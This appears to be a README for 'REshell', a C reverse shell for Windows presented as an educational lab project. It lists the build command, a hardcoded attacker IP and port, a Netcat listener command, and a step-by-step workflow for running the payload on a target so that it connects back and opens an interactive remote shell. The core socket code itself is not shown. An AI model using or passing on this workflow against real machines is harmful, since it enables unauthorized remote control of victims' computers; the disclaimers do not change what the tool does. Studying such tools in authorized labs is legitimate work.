# REshell - Windows Reverse Shell (Educational Project)

## Overview

REshell is a basic reverse shell written in C for Windows.  
It demonstrates how TCP sockets can be used to establish a remote command execution channel for learning purposes in cybersecurity and reverse engineering labs.

⚠️ Intended only for legal and educational use in controlled environments.

---

## Features

- Windows TCP reverse shell
- Winsock2 API usage
- Lightweight C implementation
- GCC (MinGW) compatible build
- Simple Netcat listener support

---

## Source Code Requirements

```c
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32.lib")
```

# Configuration

Before compiling, edit the IP address and port inside the source code:

```c
char *ip = "192.168.1.10";
int port = 8081;
```

| Setting | Description |
|---|---|
| `192.168.1.10` | Attacker machine IP |
| `8081` | Listening port |

---

# Compilation (Windows / MinGW GCC)

Compile the project using GCC:

```bash
gcc REshell.c -o REshell.exe -lws2_32
```

### Output
```bash
REshell.exe
```

---

# Running the Listener (Linux / Kali)

Start a Netcat listener on the attacker machine:

```bash
nc -nvlp 8081
```

## Netcat Arguments

| Flag | Meaning |
|---|---|
| `-n` | Disable DNS resolution |
| `-v` | Verbose mode |
| `-l` | Listen mode |
| `-p` | Select port |

---

# Running the Payload (Windows)

Execute the binary on the target machine:

```bash
REshell.exe
```

The program will attempt to connect back to the listener.

---

# Full Workflow Example

## 1. Start Listener (Linux)

```bash
nc -nvlp 8081
```

## 2. Execute Payload (Windows)

```bash
REshell.exe
```

## 3. Connection Established

If successful:
- Target connects back to listener
- Interactive shell session opens
- Commands execute remotely

---

# Learning Objectives

This project demonstrates:

- Winsock initialization (`WSAStartup`)
- TCP socket programming
- Reverse shell communication
- Process I/O redirection
- Basic malware behavior concepts

---

# Security & Detection

This type of program may be detected by:

- Windows Defender
- Antivirus software
- EDR solutions

Useful for:
- Malware analysis practice
- Reverse engineering labs
- Security research environments

---

# Limitations

- No encryption
- No persistence
- Minimal error handling
- Easily detectable
- No anti-analysis techniques

---

# Disclaimer

This project is intended strictly for:

- Educational purposes
- Cybersecurity training
- Authorized testing environments

Do NOT use on systems or networks without permission.
